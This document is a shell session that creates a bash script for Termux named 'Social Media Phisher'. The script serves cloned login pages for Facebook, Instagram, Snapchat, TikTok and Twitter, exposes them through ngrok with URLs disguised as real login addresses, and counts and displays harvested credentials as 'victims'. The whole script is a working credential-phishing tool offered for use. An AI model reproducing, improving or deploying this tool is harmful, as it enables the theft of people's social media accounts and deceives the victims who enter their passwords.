cd ~/Phisher
cat > phisher.sh << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

clear_screen() {
    clear
    echo -e "${CYAN}╔══════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║              ${RED}SOCIAL MEDIA PHISHER${NC}               ${CYAN}║${NC}"
    echo -e "${CYAN}║                  ${BLUE}v2.3 - Termux${NC}                     ${CYAN}║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════╝${NC}"
    echo
}

show_menu() {
    echo -e "${GREEN}Select Platform:${NC}"
    echo "1) ${YELLOW}Facebook${NC}"
    echo "2) ${YELLOW}Instagram${NC}"
    echo "3) ${YELLOW}Snapchat${NC}"
    echo "4) ${YELLOW}TikTok${NC}"
    echo "5) ${YELLOW}Twitter/X${NC}"
    echo "6) ${YELLOW}CUSTOM URL${NC} ← RECOMMENDED"
    echo "7) ${GREEN}View Creds${NC}"
    echo "0) ${RED}Exit${NC}"
    echo
}

get_mask_url() {
    local platform=$1
    case $platform in
        "facebook") echo "facebook.com/login/identifier" ;;
        "instagram") echo "instagram.com/accounts/login" ;;
        "snapchat") echo "accounts.snapchat.com/accounts/login" ;;
        "tiktok") echo "www.tiktok.com/login/user" ;;
        "twitter") echo "twitter.com/i/flow/login" ;;
        *) echo "login.example.com/auth" ;;
    esac
}

start_phish() {
    local platform=$1
    local port=8080
    
    # Copy template
    if [ -f "templates/${platform}.html" ]; then
        cp "templates/${platform}.html" index.html
    else
        echo -e "${RED}[!] No template: templates/${platform}.html${NC}"
        return 1
    fi
    
    echo -e "${GREEN}[+] Starting ${YELLOW}${platform^}${NC} phisher...${NC}"
    
    # PHP Server
    php -S 0.0.0.0:$port > /dev/null 2>&1 &
    PHP_PID=$!
    sleep 2
    
    # Ngrok
    local ngrok_url=""
    if command -v ngrok >/dev/null 2>&1; then
        ngrok http $port > ngrok.log 2>&1 &
        NGROK_PID=$!
        sleep 4
        ngrok_url=$(grep -o 'https://.*ngrok\.io' ngrok.log | head -1 2>/dev/null || echo "")
    fi
    
    # MASKED URL
    local mask_url=$(get_mask_url "$platform")
    echo -e "${GREEN}══════════════════════════════════════════${NC}"
    [ -n "$ngrok_url" ] && echo -e "${CYAN}🔗 MASKED:${NC} ${ngrok_url//https:/https://${mask_url}}"
    [ -n "$ngrok_url" ] && echo -e "${CYAN}🔗 DIRECT:${NC} $ngrok_url"
    echo -e "${CYAN}🌐 LOCAL:${NC} http://localhost:$port"
    echo -e "${GREEN}══════════════════════════════════════════${NC}"
    echo
    
    # Live stats
    while kill -0 $PHP_PID 2>/dev/null; do
        local count=$(grep -c "CREDENTIALS_STOLEN" logs/credentials.txt 2>/dev/null || echo "0")
        echo -e "${GREEN}👥 Victims:${RED} $count${NC}  |  ${GREEN}Live:${NC} 🟢"
        sleep 3
    done
    
    kill $PHP_PID $NGROK_PID 2>/dev/null 2>&1
    rm -f ngrok.log index.html
}

show_creds() {
    echo -e "${GREEN}══════════════════ CREDS ══════════════════${NC}"
    [ -f "logs/readable.txt" ] && cat logs/readable.txt
    [ -f "logs/credentials.txt" ] && cat logs/credentials.txt || echo -e "${YELLOW}[!] No creds${NC}"
    echo -e "${GREEN}══════════════════════════════════════════${NC}"
    read -p "Press Enter..."
}

main() {
    command -v php >/dev/null 2>&1 || { echo -e "${RED}[!] pkg install php${NC}"; exit 1; }
    mkdir -p logs www templates
    
    clear_screen
    show_menu
    read -p "Choice: " choice
    
    case $choice in
        1) start_phish "facebook" ;;
        2) start_phish "instagram" ;;
        3) start_phish "snapchat" ;;
        4) start_phish "tiktok" ;;
        5) start_phish "twitter" ;;
        6)
            echo -e "${YELLOW}CUSTOM - Pick template first:${NC}"
            echo "1) Instagram  2) Facebook  3) TikTok"
            read -p "Template (1-3): " temp
            case $temp in 1) start_phish "instagram" ;; 2) start_phish "facebook" ;; 3) start_phish "tiktok" ;; *) start_phish "instagram" ;; esac
            ;;
        7) show_creds ;;
        0) exit ;;
        *) main ;;
    esac
}

main
EOF

chmod +x phisher.sh
